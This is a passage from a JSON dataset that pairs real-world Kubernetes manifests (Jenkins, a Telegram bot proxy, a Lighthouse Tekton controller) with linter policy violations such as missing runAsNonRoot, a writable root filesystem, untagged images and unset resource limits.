config-reload\n        image: kiwigrid/k8s-sidecar:1.12.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: LABEL\n          value: jenkins-jenkins-config\n        - name: FOLDER\n          value: /var/jenkins_home/casc_configs\n        - name: NAMESPACE\n          value: jx-jenkins\n        - name: REQ_URL\n          value: http://localhost:8080/reload-configuration-as-code/?casc-reload-token=$(POD_NAME)\n        - name: REQ_METHOD\n          value: POST\n        - name: REQ_RETRY_CONNECT\n          value: '10'\n        resources: {}\n        volumeMounts:\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: jenkins-home\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: plugins\n        emptyDir: {}\n      - name: jenkins-config\n        configMap:\n          name: jenkins\n      - name: plugin-dir\n        emptyDir: {}\n      - name: jenkins-home\n        persistentVolumeClaim:\n          claimName: jenkins\n      - name: sc-config-volume\n        emptyDir: {}\n      - name: admin-secret\n        secret:\n          secretName: jenkins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jenkins\" does not have a read-only root file system"
  },
  {
    "id": "10993",
    "manifest_path": "data/manifests/the_stack_sample/sample_4215.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: jenkins\n  namespace: jx-jenkins\n  labels:\n    app.kubernetes.io/name: jenkins\n    helm.sh/chart: jenkins-3.4.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: jenkins\n    app.kubernetes.io/component: jenkins-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: jenkins-controller\n      app.kubernetes.io/instance: jenkins\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jenkins\n        app.kubernetes.io/managed-by: Helm\n        app.kubernetes.io/instance: jenkins\n        app.kubernetes.io/component: jenkins-controller\n      annotations:\n        checksum/config: 5502910095a90d9316a107aa85c959f539c7fd83343359a9244d00fb6f1df25a\n    spec:\n      securityContext:\n        runAsUser: 1000\n        fsGroup: 1000\n        runAsNonRoot: true\n      serviceAccountName: jenkins\n      initContainers:\n      - name: init\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        command:\n        - sh\n        - /var/jenkins_config/apply_config.sh\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n        - mountPath: /usr/share/jenkins/ref/plugins\n          name: plugins\n        - mountPath: /var/jenkins_plugins\n          name: plugin-dir\n      containers:\n      - name: jenkins\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        args:\n        - --httpPort=8080\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: JAVA_OPTS\n          value: '-Dcasc.reload.token=$(POD_NAME) '\n        - name: JENKINS_OPTS\n          value: ''\n        - name: JENKINS_SLAVE_AGENT_PORT\n          value: '50000'\n        - name: CASC_JENKINS_CONFIG\n          value: /var/jenkins_home/casc_configs\n        ports:\n        - containerPort: 8080\n          name: http\n        - containerPort: 50000\n          name: agent-listener\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        startupProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n          readOnly: false\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n          readOnly: true\n        - mountPath: /usr/share/jenkins/ref/plugins/\n          name: plugin-dir\n          readOnly: false\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-username\n          subPath: jenkins-admin-user\n          readOnly: true\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-password\n          subPath: jenkins-admin-password\n          readOnly: true\n      - name: config-reload\n        image: kiwigrid/k8s-sidecar:1.12.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: LABEL\n          value: jenkins-jenkins-config\n        - name: FOLDER\n          value: /var/jenkins_home/casc_configs\n        - name: NAMESPACE\n          value: jx-jenkins\n        - name: REQ_URL\n          value: http://localhost:8080/reload-configuration-as-code/?casc-reload-token=$(POD_NAME)\n        - name: REQ_METHOD\n          value: POST\n        - name: REQ_RETRY_CONNECT\n          value: '10'\n        resources: {}\n        volumeMounts:\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: jenkins-home\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: plugins\n        emptyDir: {}\n      - name: jenkins-config\n        configMap:\n          name: jenkins\n      - name: plugin-dir\n        emptyDir: {}\n      - name: jenkins-home\n        persistentVolumeClaim:\n          claimName: jenkins\n      - name: sc-config-volume\n        emptyDir: {}\n      - name: admin-secret\n        secret:\n          secretName: jenkins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jenkins\" not found"
  },
  {
    "id": "10994",
    "manifest_path": "data/manifests/the_stack_sample/sample_4215.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: jenkins\n  namespace: jx-jenkins\n  labels:\n    app.kubernetes.io/name: jenkins\n    helm.sh/chart: jenkins-3.4.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: jenkins\n    app.kubernetes.io/component: jenkins-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: jenkins-controller\n      app.kubernetes.io/instance: jenkins\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jenkins\n        app.kubernetes.io/managed-by: Helm\n        app.kubernetes.io/instance: jenkins\n        app.kubernetes.io/component: jenkins-controller\n      annotations:\n        checksum/config: 5502910095a90d9316a107aa85c959f539c7fd83343359a9244d00fb6f1df25a\n    spec:\n      securityContext:\n        runAsUser: 1000\n        fsGroup: 1000\n        runAsNonRoot: true\n      serviceAccountName: jenkins\n      initContainers:\n      - name: init\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        command:\n        - sh\n        - /var/jenkins_config/apply_config.sh\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n        - mountPath: /usr/share/jenkins/ref/plugins\n          name: plugins\n        - mountPath: /var/jenkins_plugins\n          name: plugin-dir\n      containers:\n      - name: jenkins\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        args:\n        - --httpPort=8080\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: JAVA_OPTS\n          value: '-Dcasc.reload.token=$(POD_NAME) '\n        - name: JENKINS_OPTS\n          value: ''\n        - name: JENKINS_SLAVE_AGENT_PORT\n          value: '50000'\n        - name: CASC_JENKINS_CONFIG\n          value: /var/jenkins_home/casc_configs\n        ports:\n        - containerPort: 8080\n          name: http\n        - containerPort: 50000\n          name: agent-listener\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        startupProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n          readOnly: false\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n          readOnly: true\n        - mountPath: /usr/share/jenkins/ref/plugins/\n          name: plugin-dir\n          readOnly: false\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-username\n          subPath: jenkins-admin-user\n          readOnly: true\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-password\n          subPath: jenkins-admin-password\n          readOnly: true\n      - name: config-reload\n        image: kiwigrid/k8s-sidecar:1.12.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: LABEL\n          value: jenkins-jenkins-config\n        - name: FOLDER\n          value: /var/jenkins_home/casc_configs\n        - name: NAMESPACE\n          value: jx-jenkins\n        - name: REQ_URL\n          value: http://localhost:8080/reload-configuration-as-code/?casc-reload-token=$(POD_NAME)\n        - name: REQ_METHOD\n          value: POST\n        - name: REQ_RETRY_CONNECT\n          value: '10'\n        resources: {}\n        volumeMounts:\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: jenkins-home\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: plugins\n        emptyDir: {}\n      - name: jenkins-config\n        configMap:\n          name: jenkins\n      - name: plugin-dir\n        emptyDir: {}\n      - name: jenkins-home\n        persistentVolumeClaim:\n          claimName: jenkins\n      - name: sc-config-volume\n        emptyDir: {}\n      - name: admin-secret\n        secret:\n          secretName: jenkins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"config-reload\" has cpu request 0"
  },
  {
    "id": "10995",
    "manifest_path": "data/manifests/the_stack_sample/sample_4215.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: jenkins\n  namespace: jx-jenkins\n  labels:\n    app.kubernetes.io/name: jenkins\n    helm.sh/chart: jenkins-3.4.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: jenkins\n    app.kubernetes.io/component: jenkins-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: jenkins-controller\n      app.kubernetes.io/instance: jenkins\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jenkins\n        app.kubernetes.io/managed-by: Helm\n        app.kubernetes.io/instance: jenkins\n        app.kubernetes.io/component: jenkins-controller\n      annotations:\n        checksum/config: 5502910095a90d9316a107aa85c959f539c7fd83343359a9244d00fb6f1df25a\n    spec:\n      securityContext:\n        runAsUser: 1000\n        fsGroup: 1000\n        runAsNonRoot: true\n      serviceAccountName: jenkins\n      initContainers:\n      - name: init\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        command:\n        - sh\n        - /var/jenkins_config/apply_config.sh\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n        - mountPath: /usr/share/jenkins/ref/plugins\n          name: plugins\n        - mountPath: /var/jenkins_plugins\n          name: plugin-dir\n      containers:\n      - name: jenkins\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        args:\n        - --httpPort=8080\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: JAVA_OPTS\n          value: '-Dcasc.reload.token=$(POD_NAME) '\n        - name: JENKINS_OPTS\n          value: ''\n        - name: JENKINS_SLAVE_AGENT_PORT\n          value: '50000'\n        - name: CASC_JENKINS_CONFIG\n          value: /var/jenkins_home/casc_configs\n        ports:\n        - containerPort: 8080\n          name: http\n        - containerPort: 50000\n          name: agent-listener\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        startupProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n          readOnly: false\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n          readOnly: true\n        - mountPath: /usr/share/jenkins/ref/plugins/\n          name: plugin-dir\n          readOnly: false\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-username\n          subPath: jenkins-admin-user\n          readOnly: true\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-password\n          subPath: jenkins-admin-password\n          readOnly: true\n      - name: config-reload\n        image: kiwigrid/k8s-sidecar:1.12.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: LABEL\n          value: jenkins-jenkins-config\n        - name: FOLDER\n          value: /var/jenkins_home/casc_configs\n        - name: NAMESPACE\n          value: jx-jenkins\n        - name: REQ_URL\n          value: http://localhost:8080/reload-configuration-as-code/?casc-reload-token=$(POD_NAME)\n        - name: REQ_METHOD\n          value: POST\n        - name: REQ_RETRY_CONNECT\n          value: '10'\n        resources: {}\n        volumeMounts:\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: jenkins-home\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: plugins\n        emptyDir: {}\n      - name: jenkins-config\n        configMap:\n          name: jenkins\n      - name: plugin-dir\n        emptyDir: {}\n      - name: jenkins-home\n        persistentVolumeClaim:\n          claimName: jenkins\n      - name: sc-config-volume\n        emptyDir: {}\n      - name: admin-secret\n        secret:\n          secretName: jenkins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"config-reload\" has memory limit 0"
  },
  {
    "id": "10996",
    "manifest_path": "data/manifests/the_stack_sample/sample_4216.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: cicd\n  name: myjenkins\n  labels:\n    app: myjenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: myjenkins\n  template:\n    metadata:\n      labels:\n        app: myjenkins\n    spec:\n      containers:\n      - name: jenkins\n        image: rafabene/myjenkins\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 50000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jenkins\" is using an invalid container image, \"rafabene/myjenkins\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10997",
    "manifest_path": "data/manifests/the_stack_sample/sample_4216.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: cicd\n  name: myjenkins\n  labels:\n    app: myjenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: myjenkins\n  template:\n    metadata:\n      labels:\n        app: myjenkins\n    spec:\n      containers:\n      - name: jenkins\n        image: rafabene/myjenkins\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 50000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jenkins\" does not have a read-only root file system"
  },
  {
    "id": "10998",
    "manifest_path": "data/manifests/the_stack_sample/sample_4216.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: cicd\n  name: myjenkins\n  labels:\n    app: myjenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: myjenkins\n  template:\n    metadata:\n      labels:\n        app: myjenkins\n    spec:\n      containers:\n      - name: jenkins\n        image: rafabene/myjenkins\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 50000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jenkins\" is not set to runAsNonRoot"
  },
  {
    "id": "10999",
    "manifest_path": "data/manifests/the_stack_sample/sample_4216.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: cicd\n  name: myjenkins\n  labels:\n    app: myjenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: myjenkins\n  template:\n    metadata:\n      labels:\n        app: myjenkins\n    spec:\n      containers:\n      - name: jenkins\n        image: rafabene/myjenkins\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 50000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jenkins\" has cpu request 0"
  },
  {
    "id": "11000",
    "manifest_path": "data/manifests/the_stack_sample/sample_4216.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: cicd\n  name: myjenkins\n  labels:\n    app: myjenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: myjenkins\n  template:\n    metadata:\n      labels:\n        app: myjenkins\n    spec:\n      containers:\n      - name: jenkins\n        image: rafabene/myjenkins\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 50000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jenkins\" has memory limit 0"
  },
  {
    "id": "11001",
    "manifest_path": "data/manifests/the_stack_sample/sample_4217.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: commands-proxy\n  namespace: beta-parrot-bot\n  labels:\n    app: commands-proxy\nspec:\n  selector:\n    matchLabels:\n      app: commands-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: commands-proxy\n    spec:\n      containers:\n      - name: telegram-drawer\n        image: ghcr.io/danilandreev/github-parrot-bot-dev\n        ports:\n        - containerPort: 3100\n        volumeMounts:\n        - mountPath: /.env\n          subPath: .env\n          name: env\n      volumes:\n      - name: env\n        configMap:\n          name: commands-proxy\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"telegram-drawer\" is using an invalid container image, \"ghcr.io/danilandreev/github-parrot-bot-dev\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11002",
    "manifest_path": "data/manifests/the_stack_sample/sample_4217.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: commands-proxy\n  namespace: beta-parrot-bot\n  labels:\n    app: commands-proxy\nspec:\n  selector:\n    matchLabels:\n      app: commands-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: commands-proxy\n    spec:\n      containers:\n      - name: telegram-drawer\n        image: ghcr.io/danilandreev/github-parrot-bot-dev\n        ports:\n        - containerPort: 3100\n        volumeMounts:\n        - mountPath: /.env\n          subPath: .env\n          name: env\n      volumes:\n      - name: env\n        configMap:\n          name: commands-proxy\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"telegram-drawer\" does not have a read-only root file system"
  },
  {
    "id": "11003",
    "manifest_path": "data/manifests/the_stack_sample/sample_4217.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: commands-proxy\n  namespace: beta-parrot-bot\n  labels:\n    app: commands-proxy\nspec:\n  selector:\n    matchLabels:\n      app: commands-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: commands-proxy\n    spec:\n      containers:\n      - name: telegram-drawer\n        image: ghcr.io/danilandreev/github-parrot-bot-dev\n        ports:\n        - containerPort: 3100\n        volumeMounts:\n        - mountPath: /.env\n          subPath: .env\n          name: env\n      volumes:\n      - name: env\n        configMap:\n          name: commands-proxy\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"telegram-drawer\" is not set to runAsNonRoot"
  },
  {
    "id": "11004",
    "manifest_path": "data/manifests/the_stack_sample/sample_4217.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: commands-proxy\n  namespace: beta-parrot-bot\n  labels:\n    app: commands-proxy\nspec:\n  selector:\n    matchLabels:\n      app: commands-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: commands-proxy\n    spec:\n      containers:\n      - name: telegram-drawer\n        image: ghcr.io/danilandreev/github-parrot-bot-dev\n        ports:\n        - containerPort: 3100\n        volumeMounts:\n        - mountPath: /.env\n          subPath: .env\n          name: env\n      volumes:\n      - name: env\n        configMap:\n          name: commands-proxy\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"telegram-drawer\" has cpu request 0"
  },
  {
    "id": "11005",
    "manifest_path": "data/manifests/the_stack_sample/sample_4217.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: commands-proxy\n  namespace: beta-parrot-bot\n  labels:\n    app: commands-proxy\nspec:\n  selector:\n    matchLabels:\n      app: commands-proxy\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: commands-proxy\n    spec:\n      containers:\n      - name: telegram-drawer\n        image: ghcr.io/danilandreev/github-parrot-bot-dev\n        ports:\n        - containerPort: 3100\n        volumeMounts:\n        - mountPath: /.env\n          subPath: .env\n          name: env\n      volumes:\n      - name: env\n        configMap:\n          name: commands-proxy\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"telegram-drawer\" has memory limit 0"
  },
  {
    "id": "11006",
    "manifest_path": "data/manifests/the_stack_sample/sample_4218.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.5.2\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: bd07b174a1a963f70c62f61f1655194f9a136d761d8451f940ec8eb7cb765b83\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.5.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.192.168.50.67.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.2\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 64a39607d05347a3f41d85a83fe5cce9a8160e9d\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-tekton-controller\" does not have a read-only root file system"
  },
  {
    "id": "11007",
    "manifest_path": "data/manifests/the_stack_sample/sample_4218.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.5.2\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: bd07b174a1a963f70c62f61f1655194f9a136d761d8451f940ec8eb7cb765b83\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.5.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.192.168.50.67.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.2\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 64a39607d05347a3f41d85a83fe5cce9a8160e9d\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-tekton-controller\" not found"
  },
  {
    "id": "11008",
    "manifest_path": "data/manifests/the_stack_sample/sample_4218.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.5.2\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: bd07b174a1a963f70c62f61f1655194f9a136d761d8451f940ec8eb7cb765b83\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.5.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.192.168.50.67.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.2\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 64a39607d05347a3f41d85a83fe5cce9a8160e9d\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "run-as-non-root",
